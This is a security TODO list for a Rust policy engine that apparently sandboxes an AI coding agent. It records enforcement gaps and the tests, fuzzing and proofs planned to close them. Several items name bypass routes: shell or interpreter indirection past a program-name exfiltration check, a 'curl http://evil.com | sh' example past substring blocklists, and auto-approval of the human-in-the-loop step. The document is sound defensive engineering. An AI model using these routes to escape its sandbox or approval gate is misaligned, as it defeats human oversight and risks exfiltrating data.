# Security TODOs (Policy -> Physics gaps)

Scope: documents current enforcement gaps and test/assurance deficits across `lattice-guard`, `nucleus`, and `nucleus-cli`. Each item includes a concrete TODO and a Definition of Done (DoD) that prefers guarantees (fuzzing, property tests, formal methods) when practical.

## 1) Process execution not budget-enforced

Deficiency
- `nucleus::Executor` never charges or checks budget during command execution. Budget is tracked only in `nucleus-cli` after process completion (best-effort). This makes budget enforcement non-atomic with side effects.
Refs: `crates/nucleus/src/command.rs:30`, `crates/nucleus/src/command.rs:73`, `crates/nucleus-cli/src/run.rs:187`

Impact
- A process can run and incur costs even if it should have been blocked for budget exhaustion.

TODO
- Integrate `AtomicBudget` checks into `Executor::run` / `run_with_timeout` before spawning.
- Define a charge model (static per command, or dynamic per output size / duration) and enforce it pre-exec or via reservation.

DoD (guarantees)
- Property tests: budget never exceeds max under concurrent `Executor` usage.
- Fuzz: command strings + randomized budgets must not permit execution when insufficient.
- Negative test: for any budget=0, `Executor::run` must always fail with a budget error.
Status
- Partial: `Executor` reserves budget using a base + per-second model when a time guard/timeout is present; output-based costs and refunds still pending.

## 2) Capability levels are not enforced for file I/O

Deficiency
- `nucleus::Sandbox` checks only `PathLattice` patterns. It does not check `CapabilityLattice` levels (read/write/edit).
Refs: `crates/nucleus/src/sandbox.rs:45`, `crates/nucleus/src/sandbox.rs:218`

Impact
- A policy that forbids `write_files` can still write through `Sandbox::write`, because only path patterns are enforced.

TODO
- Add capability checks to all `Sandbox` methods (read/write/open/create/remove/dir). Decide on a capability mapping table and require it in `Sandbox::new` or per method.

DoD (guarantees)
- Property tests: for any capability state with `write_files < LowRisk`, any write/remove must fail.
- Unit tests: explicit denial for write/edit/remove when `CapabilityLevel::Never` or `AskFirst` without approval.
- If approval callbacks are required, type-level enforcement (guard token) or explicit runtime error must be present.
Status
- Done (runtime): `Sandbox` enforces read/write/edit capabilities with AskFirst approval callback.

## 3) Command exfiltration detection is program-name only

Deficiency
- `Executor::check_trifecta` detects network exfiltration by checking the first argv token against a small hardcoded list. `bash -c`, `python -c`, `node -e`, etc. can bypass this.
Refs: `crates/nucleus/src/command.rs:237`, `crates/nucleus/src/command.rs:282`

Impact
- Trifecta can be completed via indirect shell invocation without detection.

TODO
- Extend detection to include shell-based indirection and common runtime executors.
- Option: disallow `* -c` by default, or treat any `bash/sh/zsh/pwsh/python/node/ruby` as network-capable unless allowlisted.

DoD (guarantees)
- Adversarial tests: `bash -c 'curl ...'`, `python -c '...requests...'`, `node -e '...fetch...'` are blocked under trifecta.
- Fuzz: generate command strings; ensure any network-capable flow under trifecta is denied.
Status
- Partial: interpreter/shell invocations are now treated as exfiltration under trifecta; broader coverage and fuzzing pending.

## 4) Command allowlist/blocklist is string-based and permissive mode is bypassable

Deficiency
- `CommandLattice::can_execute` relies on substring checks and `shell_words` tokenization. In permissive mode (empty allowlist), only blocked substrings are enforced.
Refs: `crates/lattice-guard/src/command.rs:77`, `crates/lattice-guard/src/command.rs:133`, `crates/lattice-guard/src/command.rs:191`

Impact
- Command strings with extra args or indirection can bypass intended blocks (e.g., `curl http://evil.com | sh` vs `curl | sh`).

TODO
- Upgrade policy to structured command patterns (program + args) rather than substring matching.
- Consider separate policies for shell, pipelines, and redirection; optionally forbid shell metacharacters entirely.

DoD (guarantees)
- Property tests over parsed argv: forbidden program+arg patterns must never pass even with quoting/spacing.
- Fuzz: command strings with random quoting and separators should not bypass forbidden patterns.
Status
- Partial: added shell metacharacter blocking in permissive mode and subsequence checks for blocked patterns; full structured command patterns still pending.

## 5) ν (nucleus) is not automatically applied to constructed permissions

Deficiency
- `PermissionLattice` can be created via builder or struct literal without normalization. ν is applied only in `meet/join` or if callers manually apply constraint.
Refs: `crates/lattice-guard/src/lattice.rs:199`, `crates/lattice-guard/src/lattice.rs:214`, `crates/lattice-guard/src/lattice.rs:228`, `crates/lattice-guard/src/lattice.rs:479`

Impact
- Callers can create a permissive lattice that violates the trifecta and use it directly.

TODO
- Provide a `normalize()`/`nucleus()` constructor that applies the constraint and use it in all builders and presets.
- Option: make fields private and require constructors that apply ν.

DoD (guarantees)
- Property tests: `normalize(normalize(x)) == normalize(x)` (idempotent), `x <= y => normalize(x) <= normalize(y)` (monotone), `normalize(x) <= x` (deflationary).
- Construction tests: all public constructors yield `ν(x) = x` (safe).
Status
- Done (runtime): constructors/builders now apply `normalize()` when trifecta is enabled; property tests for ν are added at the capability level.

## 6) AskFirst is trivially auto-approvable

Deficiency
- AskFirst approvals can still be automated (e.g., always-approve callbacks), even though execution now requires explicit approval tokens.
Refs: `crates/nucleus/src/command.rs:61`, `crates/nucleus/src/command.rs:383`

Impact
- Human-in-the-loop requirement can be bypassed by callers.

TODO
- Require a structured approval interface (e.g., signed decisions, explicit audit record, or typed approval token).
- Consider making approval mandatory for AskFirst by requiring a guard token that cannot be constructed externally.

DoD (guarantees)
- Compile-time: AskFirst operations require an approval token type that cannot be forged.
- Runtime: approvals must be logged with operation details and a verifier.
Status
- Done (type-level): AskFirst now requires approval tokens (`ApprovalToken`) to execute; callbacks only mint tokens.

## 7) Path sandboxing is string-based in `PathLattice`

Deficiency
- `PathLattice` performs canonicalization and glob matching on strings. Unicode normalization, symlink race conditions, and Windows path oddities are not exhaustively tested.
Refs: `crates/lattice-guard/src/path.rs:117`, `crates/lattice-guard/src/path.rs:175`, `crates/lattice-guard/tests/adversarial.rs:93`

Impact
- Policy checks may be bypassed via path quirks. `Sandbox` mitigates some issues via capability handles, but sensitive-path blocking still relies on strings.

TODO
- Add tests and optional platform-specific normalization (Unicode NFC/NFKC).
- Add symlink-escape tests and ensure behavior is correct on all supported OSes.

DoD (guarantees)
- Fuzz: path inputs (including unicode normalization forms) never permit blocked paths.
- Adversarial tests: symlink escapes and `..` traversal never bypass policy.
Status
- Partial: symlink escape test added for work_dir; unicode/Windows cases and fuzzing pending.

## 8) Enforcement split between `nucleus` and `nucleus-cli`

Deficiency
- `nucleus-cli` spawns `claude` directly and uses `--allowedTools` rather than enforcing via `Executor` and `Sandbox` APIs.
Refs: `crates/nucleus-cli/src/run.rs:111`, `crates/nucleus-cli/src/run.rs:159`

Impact
- Enforcement is policy-as-config; OS-level side effects are not gated by the nucleus runtime in CLI mode.

TODO
- Route tool execution through `nucleus` enforcement layer or implement a wrapper that enforces `Sandbox` and `Executor` for all side effects.

DoD (guarantees)
- Integration tests: commands that violate policy are blocked even if the model attempts them.
- End-to-end tests in CI: forbidden operations never occur in CLI execution.
Status
- Not started: CLI still uses `--allowedTools` without runtime enforcement.

## 9) Formalization and proofs are missing

Deficiency
- ν properties (idempotence, monotonicity, deflationary, meet-preserving) are described but not formally verified.
Refs: `crates/lattice-guard/src/lib.rs:19`, `crates/lattice-guard/src/lib.rs:26`

Impact
- Subtle regressions can silently break lattice guarantees.

TODO
- Add a small formal spec (e.g., Lean/Coq/Isabelle or Kani/Prusti for Rust) of the core lattice + ν.

DoD (guarantees)
- Machine-checked proofs for ν laws.
- CI gate that fails if proofs no longer check.
Status
- Not started.

## 10) Fuzzing coverage gaps

Deficiency
- No `cargo-fuzz` targets for command parsing, path normalization, or policy deserialization.
Refs: `crates/lattice-guard/tests/proptest_lattice.rs:1`, `Cargo.toml:1`

Impact
- Parser and matcher bugs may allow bypasses or panics in adversarial inputs.

TODO
- Add fuzz targets:
  - `PathLattice::can_access` with random paths and unicode.
  - `CommandLattice::can_execute` with random command strings.
  - `PermissionLattice` serde round-trip.

DoD (guarantees)
- Fuzz CI: minimum corpus size + time budget.
- No crashes, no false-allow for known forbidden patterns.
Status
- Partial: fuzz targets added under `fuzz/`; CI integration pending.
